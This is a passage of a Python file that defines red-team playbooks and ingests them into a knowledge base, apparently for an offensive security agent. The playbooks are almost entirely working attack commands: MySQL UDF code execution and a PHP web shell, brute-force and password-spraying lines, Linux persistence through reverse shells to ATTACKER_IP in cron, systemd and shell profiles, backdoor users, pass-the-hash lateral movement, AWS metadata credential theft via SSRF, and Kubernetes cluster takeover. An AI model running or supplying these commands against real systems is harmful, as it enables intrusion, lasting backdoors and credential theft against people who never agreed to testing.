    phase="exploit", outcome="shell obtained",
    tools=["mysql", "sqlmap", "metasploit"],
    mitre_ttps=["T1190", "T1059", "T1213"],
    attack_types=["mysql_rce"], services=["mysql"],
    os_hint="linux",
    text="""
MySQL Exploitation - User Defined Functions for RCE and credential dumping.

FIND MYSQL:
  nmap -p 3306 TARGET_IP
  nmap -p 3306 --script mysql-info,mysql-empty-password TARGET_IP

CONNECT TO MYSQL:
  mysql -u root -p -h TARGET_IP  (interactive)
  mysql -u root -pPASSWORD -h TARGET_IP -e "show databases;"
  mysqldump -u root -pPASSWORD -h TARGET_IP --all-databases > dump.sql

CHECK FILE READ/WRITE PERMISSIONS:
  SHOW VARIABLES LIKE 'secure_file_priv';  (NULL = no restriction, empty = any path, path = restricted)
  SELECT @@global.secure_file_priv;

FILE READ via LOAD_FILE:
  SELECT LOAD_FILE('/etc/passwd');
  SELECT LOAD_FILE('/var/www/html/config.php');

FILE WRITE via INTO OUTFILE:
  SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
  SELECT '' INTO OUTFILE '/root/.ssh/authorized_keys';

DUMP MYSQL CREDENTIALS HASHES:
  USE mysql; SELECT user,password FROM user;
  SELECT user,authentication_string FROM mysql.user;
  Crack with hashcat: hashcat -m 300 hash.txt wordlist.txt

UDF RCE (User Defined Function exploitation):
  Requires FILE privilege and ability to write to plugin directory
  Upload UDF shared library (raptor_udf or lib_mysqludf_sys)
  CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
  SELECT sys_exec('chmod +s /bin/bash');

METASPLOIT UDF payloads:
  use exploit/multi/mysql/mysql_udf_payload
  set RHOSTS TARGET, set USERNAME root, set PASSWORD pass
  run

MITRE: T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter
"""),

]  # end DATABASE_PLAYBOOKS


# ===========================================================================
#  INITIAL ACCESS AND RECONNAISSANCE PLAYBOOKS
# ===========================================================================

INITIAL_ACCESS_PLAYBOOKS = [

_pb(
    title="Recon - Nmap Methodology Full Scan",
    phase="recon", outcome="attack surface mapped",
    tools=["nmap", "masscan", "rustscan"],
    mitre_ttps=["T1046", "T1590"],
    attack_types=["port_scan", "recon"], services=[],
    text="""
Nmap Scanning Methodology - Systematic port scanning and service enumeration.

PHASE 1 - Fast initial scan all TCP ports:
  nmap -p- --min-rate 5000 -T4 TARGET_IP -oA initial_scan
  rustscan -a TARGET_IP --ulimit 5000 -- -sV -sC  (faster alternative)
  masscan -p1-65535 TARGET_IP --rate=1000  (fastest, noisiest)

PHASE 2 - Detailed scan of open ports:
  nmap -p 22,80,443,8080 -sV -sC -O TARGET_IP -oA detailed_scan
  -sV: version detection
  -sC: default scripts
  -O: OS detection
  -A: aggressive (sV + sC + O + traceroute)

PHASE 3 - Targeted script scan by service:
  HTTP: nmap -p 80,443 --script http-title,http-headers,http-methods TARGET_IP
  SMB: nmap -p 139,445 --script smb-vuln-*,smb-enum-* TARGET_IP
  FTP: nmap -p 21 --script ftp-anon,ftp-vsftpd-backdoor TARGET_IP
  SSH: nmap -p 22 --script ssh-auth-methods TARGET_IP
  SNMP: nmap -p 161 --script snmp-info TARGET_IP -sU

UDP SCAN (critical to not miss):
  nmap -sU -T4 --top-ports 100 TARGET_IP  (top 100 UDP ports)
  nmap -sU -p 53,69,161,500,5353 TARGET_IP  (DNS,TFTP,SNMP,IKE,mDNS)

NETWORK RANGE DISCOVERY:
  nmap -sn 192.168.1.0/24  (ping sweep)
  nmap -sn 10.0.0.0/8 --exclude 10.0.0.1  (large range)
  arp-scan -l  (local network discovery)

OUTPUT FORMATS:
  -oA basename: saves .nmap, .xml, .gnmap
  -oN file: normal output
  -oX file: XML (importable to Metasploit)
  msfconsole: db_import scan.xml

MITRE: T1046 Network Service Discovery, T1590 Gather Victim Network Information
"""),

_pb(
    title="Recon - Web Directory and Content Enumeration",
    phase="recon", outcome="attack surface mapped",
    tools=["ffuf", "gobuster", "feroxbuster", "dirsearch"],
    mitre_ttps=["T1083", "T1595"],
    attack_types=["web_enum", "directory_bruteforce"], services=["http", "https"],
    text="""
Web Content Enumeration - Discover hidden files, directories, subdomains, and parameters.

DIRECTORY ENUMERATION with ffuf (fastest):
  ffuf -u http://TARGET/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403
  ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php,.txt,.html,.bak -mc 200,301,302
  ffuf -u http://TARGET/FUZZ -w wordlist.txt -ac  (-ac = auto calibrate to filter false positives)

GOBUSTER alternatives:
  gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html
  gobuster dir -u http://TARGET -w wordlist.txt -t 50 -k  (-k = skip TLS verify)

FEROXBUSTER (recursive):
  feroxbuster -u http://TARGET -w wordlist.txt --depth 3 -x php,html,txt

SUBDOMAIN ENUMERATION:
  ffuf -u http://FUZZ.TARGET.COM -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.TARGET.COM"
  gobuster dns -d TARGET.COM -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  dnsrecon -d TARGET.COM -D wordlist.txt -t brt
  amass enum -d TARGET.COM

PARAMETER DISCOVERY:
  ffuf -u http://TARGET/page.php?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200
  arjun -u http://TARGET/api/endpoint  (automated parameter discovery)

VIRTUAL HOST DISCOVERY:
  ffuf -u http://TARGET -H "Host: FUZZ.TARGET.COM" -w subdomains.txt -mc 200,301,302

COMMON WORDLISTS:
  /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
  /usr/share/seclists/Discovery/Web-Content/common.txt
  /usr/share/wordlists/dirb/big.txt
  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

MITRE: T1083 File and Directory Discovery, T1595 Active Scanning
"""),

_pb(
    title="Recon - Password Brute Force and Spraying",
    phase="exploit", outcome="credential obtained",
    tools=["hydra", "crackmapexec", "medusa", "kerbrute"],
    mitre_ttps=["T1110.001", "T1110.003"],
    attack_types=["brute_force", "password_spray"], services=["http", "ssh", "ftp", "smb"],
    text="""
Password Brute Force and Spraying - Systematically test credentials against services.

SSH BRUTE FORCE:
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
  hydra -L users.txt -P pass.txt ssh://TARGET_IP -t 10
  medusa -h TARGET_IP -u root -P rockyou.txt -M ssh

HTTP FORM BRUTE FORCE:
  hydra -l admin -P rockyou.txt TARGET_IP http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"
  hydra -l admin -P rockyou.txt TARGET_IP http-get-form "/login:user=^USER^&pass=^PASS^:Invalid"
  hydra -l admin -P rockyou.txt -s 443 TARGET_IP https-post-form "/login:user=^USER^&pass=^PASS^:fail"

SMB BRUTE FORCE:
  crackmapexec smb TARGET_IP -u admin -p rockyou.txt
  crackmapexec smb TARGET_IP -u users.txt -p passwords.txt --no-bruteforce  (spray mode)

PASSWORD SPRAYING (one password against many users - avoids lockout):
  crackmapexec smb DC_IP -u users.txt -p 'Company2024!' --continue-on-success
  kerbrute passwordspray -d DOMAIN.LOCAL --dc DC_IP users.txt 'Spring2024!'
  crackmapexec smb DC_IP -u users.txt -p 'Password1' --continue-on-success

GENERATE PASSWORD LIST based on target:
  cewl http://TARGET -d 3 -m 5 -w custom_wordlist.txt  (scrape words from site)
  Add company name + year + special char: Company2024!, Company@2024, Summer2024

COMMON DEFAULT CREDENTIALS to always try:
  admin:admin, admin:password, admin:123456, root:root, test:test
  Application defaults: tomcat:tomcat, jenkins:jenkins, gitlab:gitlab

MITRE: T1110.001 Brute Force Password Guessing, T1110.003 Brute Force Password Spraying
"""),

_pb(
    title="Post-Exploit - Linux Persistence Mechanisms",
    phase="post-exploit", outcome="persistent access",
    tools=["crontab", "ssh-keygen"],
    mitre_ttps=["T1053.003", "T1098.004", "T1543.002"],
    attack_types=["persistence"], services=[],
    os_hint="linux",
    text="""
Linux Persistence - Maintain access after initial shell is lost.

SSH AUTHORIZED KEYS (stealthiest):
  mkdir -p /home/TARGET_USER/.ssh
  echo 'ATTACKER_SSH_PUB_KEY' >> /home/TARGET_USER/.ssh/authorized_keys
  chmod 700 /home/TARGET_USER/.ssh
  chmod 600 /home/TARGET_USER/.ssh/authorized_keys
  For root: echo 'KEY' >> /root/.ssh/authorized_keys

CRON JOB PERSISTENCE:
  (crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") | crontab -
  echo '* * * * * root /tmp/.backdoor.sh' >> /etc/crontab
  Create script: echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/.backdoor.sh; chmod +x /tmp/.backdoor.sh

ADD BACKDOOR USER:
  useradd -m -s /bin/bash -G sudo backdoor
  echo 'backdoor:password' | chpasswd
  Or directly: echo 'backdoor:$1$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

SUID BASH BACKDOOR:
  cp /bin/bash /tmp/.bash
  chmod u+s /tmp/.bash
  Execute later: /tmp/.bash -p

SYSTEMD PERSISTENCE (survives reboots):
  Create /etc/systemd/system/backdoor.service
  ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
  systemctl enable backdoor

PROFILE SCRIPT PERSISTENCE:
  echo 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' >> /etc/profile
  echo 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' >> ~/.bashrc

MITRE: T1053.003 Cron, T1098.004 SSH Authorized Keys, T1543.002 Systemd Service
"""),

_pb(
    title="Post-Exploit - Pivoting and Lateral Movement",
    phase="post-exploit", outcome="internal network accessed",
    tools=["crackmapexec", "impacket", "evil-winrm", "mimikatz", "ssh"],
    mitre_ttps=["T1021.002", "T1021.006", "T1550.002"],
    attack_types=["lateral_movement", "pivoting"], services=["smb", "winrm"],
    text="""
Lateral Movement - Move from compromised host to additional targets on the internal network.

CREDENTIAL REUSE across network (spray dumped creds):
  crackmapexec smb SUBNET/24 -u USER -p PASS  (spray credentials)
  crackmapexec smb SUBNET/24 -u USER -H NTLM_HASH  (pass-the-hash spray)
  crackmapexec smb SUBNET/24 -u users.txt -p PASS --continue-on-success

PSEXEC / WMIEXEC via Impacket:
  impacket-psexec DOMAIN/USER:PASS@TARGET  (creates service, SYSTEM shell)
  impacket-wmiexec DOMAIN/USER:PASS@TARGET  (via WMI, less noisy)
  impacket-smbexec DOMAIN/USER:PASS@TARGET  (via SMB, no binary dropped)

EVIL-WINRM (WinRM port 5985/5986):
  evil-winrm -i TARGET_IP -u USER -p PASS
  evil-winrm -i TARGET_IP -u USER -H NTLM_HASH  (PTH)

PASS-THE-HASH:
  crackmapexec smb TARGET_IP -u Administrator -H NTLM_HASH --local-auth
  impacket-psexec -hashes :NTLM_HASH Administrator@TARGET_IP
  evil-winrm -i TARGET_IP -u Administrator -H NTLM_HASH

PASS-THE-TICKET:
  Import ticket: Rubeus.exe ptt /ticket:BASE64_TICKET or mimikatz kerberos::ptt ticket.kirbi
  Use with impacket: KRB5CCNAME=ticket.ccache impacket-psexec -k -no-pass DOMAIN/USER@TARGET

FIND TARGETS TO MOVE TO:
  crackmapexec smb SUBNET/24 --shares  (find accessible shares)
  crackmapexec smb SUBNET/24 -u USER -p PASS --local-auth  (test local admin everywhere)

MITRE: T1021.002 Remote Services SMB, T1550.002 Pass the Hash
"""),

]  # end INITIAL_ACCESS_PLAYBOOKS


# ===========================================================================
#  CLOUD AND CONTAINER PLAYBOOKS
# ===========================================================================

CLOUD_PLAYBOOKS = [

_pb(
    title="Cloud - AWS IMDS SSRF Credential Theft",
    phase="exploit", outcome="cloud credential obtained",
    tools=["curl", "awscli"],
    mitre_ttps=["T1552.005", "T1078.004"],
    attack_types=["cloud_exploit", "ssrf"], services=["http"],
    os_hint="linux",
    text="""
AWS IMDS Credential Theft via SSRF - Steal IAM credentials from EC2 metadata service.
Critical: test this whenever you find an SSRF vulnerability in an AWS-hosted app.

DETECT AWS ENVIRONMENT:
  curl http://169.254.169.254/latest/meta-data/  (responds = AWS EC2)
  Via SSRF: target=http://169.254.169.254/latest/meta-data/

ENUMERATE METADATA:
  curl http://169.254.169.254/latest/meta-data/
  curl http://169.254.169.254/latest/meta-data/hostname
  curl http://169.254.169.254/latest/meta-data/iam/info
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

GET IAM ROLE NAME then credentials:
  ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
  Returns JSON with: AccessKeyId, SecretAccessKey, Token (temporary)

USE STOLEN CREDENTIALS:
  export AWS_ACCESS_KEY_ID=AKIA...
  export AWS_SECRET_ACCESS_KEY=...
  export AWS_SESSION_TOKEN=...  (if temporary creds)
  aws sts get-caller-identity  (verify credentials work)
  aws s3 ls  (list all S3 buckets)
  aws ec2 describe-instances  (list all EC2 instances)
  aws iam list-users  (list IAM users if permission allows)

IMDSv2 - Token required (but try v1 first):
  TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

PACU - AWS post-exploitation framework:
  pacu (interactive), run modules/recon after setting credentials

MITRE: T1552.005 Cloud Instance Metadata API, T1078.004 Valid Accounts Cloud Accounts
"""),

_pb(
    title="Container - Kubernetes RBAC Misconfiguration",
    phase="exploit", outcome="cluster compromised",
    tools=["kubectl", "kube-hunter"],
    mitre_ttps=["T1613", "T1078.004"],
    attack_types=["k8s_exploit", "container_escape"], services=[],
    os_hint="linux",
    text="""
Kubernetes Exploitation - RBAC misconfiguration and pod escape for cluster compromise.

DETECT KUBERNETES:
  nmap -p 6443,8443,10250,10255 TARGET_IP  (API server, kubelet ports)
  curl -k https://TARGET_IP:6443/version  (unauthenticated version check)

CHECK CURRENT PERMISSIONS (if inside a pod):
  kubectl auth can-i --list  (shows all allowed verbs)
  kubectl auth can-i create pods
  kubectl auth can-i get secrets

SERVICE ACCOUNT TOKEN inside pod:
  cat /var/run/secrets/kubernetes.io/serviceaccount/token
  APISERVER=$(grep server /etc/kubernetes/admin.conf | cut -d' ' -f6)
  curl -k -H "Authorization: Bearer $TOKEN" https://$APISERVER/api/v1/namespaces/default/secrets

PRIVESC via create pods with hostPath:
  If allowed to create pods: mount host filesystem via hostPath volume
  kubectl run priv-pod --image=alpine --overrides='{"spec":{"volumes":[{"name":"host","hostPath":{"path":"/"}}],"containers":[{"name":"priv-pod","image":"alpine","command":["sleep","infinity"],"volumeMounts":[{"mountPath":"/host","name":"host"}]}]}}'
  kubectl exec -it priv-pod -- chroot /host /bin/bash

PRIVESC via exec into privileged pod:
  kubectl get pods --all-namespaces  (find privileged pods)
  kubectl exec -it PRIVILEGED_POD -- /bin/bash
  Inside: look for hostPath mounts, check capabilities with capsh --print

SECRETS ENUMERATION:
  kubectl get secrets --all-namespaces
  kubectl get secret SECRET_NAME -o yaml  (base64 encoded values)
  echo BASE64 | base64 -d  (decode)

KUBELET EXPLOITATION (port 10250 unauthenticated):
  curl -k https://TARGET_IP:10250/pods  (list pods)
  curl -k -XPOST https://TARGET_IP:10250/run/default/POD/CONTAINER -d "cmd=id"

KUBE-HUNTER:
  kube-hunter --remote TARGET_IP  (remote scan for vulnerabilities)
  kube-hunter --pod  (scan from inside a pod)

MITRE: T1613 Container and Resource Discovery, T1078.004 Valid Accounts Cloud Accounts
"""),

]  # end CLOUD_PLAYBOOKS


# ===========================================================================
#  INGEST FUNCTION
# ===========================================================================

def ingest_all(kb=None):
    """Ingest all red-team playbooks into the knowledge base."""
    import os, sys
    sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

    if kb is None:
        from knowledge.knowledge_base import KnowledgeBase
        kb = KnowledgeBase()

    all_playbooks = (
        AD_PLAYBOOKS
        + WEB_PLAYBOOKS
        + LINUX_PRIVESC_PLAYBOOKS
        + WINDOWS_PRIVESC_PLAYBOOKS
        + NETWORK_PLAYBOOKS
        + DATABASE_PLAYBOOKS
        + INITIAL_ACCESS_PLAYBOOKS
        + CLOUD_PLAYBOOKS
    )

    source = "redteam_kb_seed"
    ingested = 0
    for i, pb in enumerate(all_playbooks):
        text = f"{_EMBED_PREFIX}{pb['title']}\n\n{pb['text']}"
        kb.ingest(
            text=text,
            source_file=source,
            chunk_index=i,
            metadata=pb["metadata"],
        )
        ingested += 1
        print(f"  [{i+1}/{len(all_playbooks)}] Ingested: {pb['title']}")

    print(f"\nDone. Ingested {ingested} red-team playbooks.")
    return ingested


if __name__ == "__main__":
    ingest_all()
